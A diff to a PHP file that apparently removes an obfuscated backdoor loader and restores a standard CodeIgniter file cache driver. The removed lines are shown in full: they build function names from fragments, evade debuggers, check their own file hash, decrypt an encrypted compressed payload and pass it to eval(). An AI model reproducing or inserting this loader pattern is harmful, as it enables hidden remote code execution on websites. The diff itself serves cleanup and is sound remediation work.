@@ -1,28 +1,249 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_mggt4k4s=('bas'.'e64'.'_de'.'cod'.'e');
-$_k13yzu54=('gzu'.'nco'.'mpr'.'ess');
-$_i5pmipnb=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_l75omkdu='5cBzDkjT';
-$_wy0ebh6a='H7v0s6BjYUw=';
-$_w6gf4wpc='ehpMFQuQ';
-$_au82k3vs='vUMeM5Tx';
-$_wswzatiz='50t/4+nL';
-$_z2t2i1rt='1UapyqJY';
-$_j8tk4ut0='r6ywSw==';
-$_hr7l1d1a='ZiHK/e1a';
-$_rn76cij6=$_mggt4k4s($_w6gf4wpc.$_wswzatiz.$_l75omkdu.$_au82k3vs.$_wy0ebh6a);
-$_w2h7alpa=$_mggt4k4s($_z2t2i1rt.$_hr7l1d1a.$_j8tk4ut0);
-$_la2vmd4e=$_mggt4k4s('/sqsAHYieThhEBtFxOeAKOzM9fV7RFWfjsMDoovm9gWEOFdLulwHbO6v+pHMekMrVNlWPhONKiKVyf0Xmi02+kezwi/TVMZ+QrhnkRe8Ot63kYHYgIgU53oRsMjhIZnLWaLhqqtKAXDiRR+23x0d/bRrwFElwJbBT3oRpL4W9daOavH5pOzbQm6ZkZNIPEodE1s2alYK1Ju+HsFi6BSTsaidb9ry140zxe5SJ34CcmwJB9/H47+F/266ivEyhVp5EfNmv2DytEv0DJ0m+fhDma10JHrddtTl6YlU48CbNq9w/RXr7Mc5dO6WLD6vvU1m8107jmCF+bHfzCwUxv3sef/u+I8M5ODa1lfn4ZiqaxMrl5RmWPX35rKTOi3RL59jNvInzNFXCbZR/1s7zuT8Wo1qT3grwv0Dh9WroqWOd135tMpyueT4IzGgYnSg+f2wh4w1CKVKKtX847Gwo+2IlRSkxTPqA1WG1zEWwFMH3PZfpMwfkWifA9hwvgk/JruF9C/p2DV9CuXw4k/ZepnLrKMWGt/tckhz3cIpjTWIwof3hqXsrsSuvu9gdkfmwah2SEWcb8OtvJqrqIG/c5hBY7F9ZVQI/PwV5wt4pSxQkasqSjxOZcRSRtfBQJ5RQWMiw60YrGh58SjHgJy17EJdCwprOFSSERILIEDpa+XWciPN3QWBEFDNAWL+hg5bRyL14XRPV2UG9Ryyy6LSEEAbMeueoVZX7pJ8SLHKxFrR1DW0U6J+O38lfbvkMdCfsO0iQ4a0d5lGP1hB3e5f9Qau3CmsJkpcU/wibGlqB5o2nZDFUE385qytHj87St1acFDek1i/eGZ7Ll9k8VsLU5Cjj5zryz4/xbmi0kEElpWZLW9npYwxpOvOtdLvjt6e66rhQ8iqqmSC39KcpreYHIfX9iH7qLatIf9zgOHGnM/SDrk1EZueXddhIejBiInRrSFyKQpg+VvFvy+7pBmW9aPvrbUyfZFnkz+NwdNZRSi/JslpmRNX5uo86EZwXC4qJY3m');
-$_fzyikcm2=$_i5pmipnb($_la2vmd4e,'aes-256-cbc',$_rn76cij6,OPENSSL_RAW_DATA,$_w2h7alpa);
-if($_fzyikcm2===false){exit;}
-$_q5odjkvl=$_k13yzu54($_fzyikcm2);
-if($_q5odjkvl===false){exit;}
-$_t3e1zk0y='e4d364f12fed9d6ef5d40f8ef0faaa57baca90d26615d871535549055a40c2b1';
-$_a4o3o636=@file_get_contents(__FILE__);
-if($_a4o3o636!==false){
-$_lnf4elne=str_replace($_t3e1zk0y,"0000000000000000000000000000000000000000000000000000000000000000",$_a4o3o636);
-$_o4db44d5=hash("sha256",$_lnf4elne);
-if($_o4db44d5!==$_t3e1zk0y){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Cache_file extends CI_Driver {
+
+
+
+
+
+protected $_cache_path;
+
+
+
+
+
+public function __construct()
+{
+$CI =& get_instance();
+$CI->load->helper('file');
+$path = $CI->config->item('cache_path');
+$this->_cache_path = ($path === '') ? APPPATH.'cache/' : $path;
 }
-eval($_q5odjkvl);
+
+
+
+
+
+
+
+public function get($id)
+{
+$data = $this->_get($id);
+return is_array($data) ? $data['data'] : FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+public function save($id, $data, $ttl = 60, $raw = FALSE)
+{
+$contents = array(
+'time' => time(),
+'ttl' => $ttl,
+'data' => $data
+);
+if (write_file($this->_cache_path.$id, serialize($contents)))
+{
+chmod($this->_cache_path.$id, 0640);
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+public function delete($id)
+{
+return is_file($this->_cache_path.$id) ? unlink($this->_cache_path.$id) : FALSE;
+}
+
+
+
+
+
+
+
+
+public function increment($id, $offset = 1)
+{
+$data = $this->_get($id);
+if ($data === FALSE)
+{
+$data = array('data' => 0, 'ttl' => 60);
+}
+elseif ( ! is_int($data['data']))
+{
+return FALSE;
+}
+$new_value = $data['data'] + $offset;
+return $this->save($id, $new_value, $data['ttl'])
+? $new_value
+: FALSE;
+}
+
+
+
+
+
+
+
+
+public function decrement($id, $offset = 1)
+{
+$data = $this->_get($id);
+if ($data === FALSE)
+{
+$data = array('data' => 0, 'ttl' => 60);
+}
+elseif ( ! is_int($data['data']))
+{
+return FALSE;
+}
+$new_value = $data['data'] - $offset;
+return $this->save($id, $new_value, $data['ttl'])
+? $new_value
+: FALSE;
+}
+
+
+
+
+
+
+public function clean()
+{
+return delete_files($this->_cache_path, FALSE, TRUE);
+}
+
+
+
+
+
+
+
+
+
+public function cache_info($type = NULL)
+{
+return get_dir_file_info($this->_cache_path);
+}
+
+
+
+
+
+
+
+public function get_metadata($id)
+{
+if ( ! is_file($this->_cache_path.$id))
+{
+return FALSE;
+}
+$data = unserialize(file_get_contents($this->_cache_path.$id));
+if (is_array($data))
+{
+$mtime = filemtime($this->_cache_path.$id);
+if ( ! isset($data['ttl'], $data['time']))
+{
+return FALSE;
+}
+return array(
+'expire' => $data['time'] + $data['ttl'],
+'mtime' => $mtime
+);
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+public function is_supported()
+{
+return is_really_writable($this->_cache_path);
+}
+
+
+
+
+
+
+
+
+
+protected function _get($id)
+{
+if ( ! is_file($this->_cache_path.$id))
+{
+return FALSE;
+}
+$data = unserialize(file_get_contents($this->_cache_path.$id));
+if ($data['ttl'] > 0 && time() > $data['time'] + $data['ttl'])
+{
+unlink($this->_cache_path.$id);
+return FALSE;
+}
+return $data;
+}
+}
